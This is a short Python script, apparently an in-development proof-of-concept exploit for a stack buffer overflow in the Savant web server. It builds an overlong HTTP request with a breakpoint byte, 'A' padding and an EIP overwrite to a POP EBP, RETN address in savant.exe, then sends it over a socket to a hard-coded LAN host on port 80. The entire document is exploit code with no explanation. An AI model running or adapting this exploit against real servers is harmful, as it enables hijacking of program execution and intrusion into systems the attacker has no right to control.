#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=80

badbuffer = "\xcc"
badbuffer += "\x41" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\x70\x71\x72\x73\x74\x75\x78\x79\x7A\x7B" # Test for working conditional jumps

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

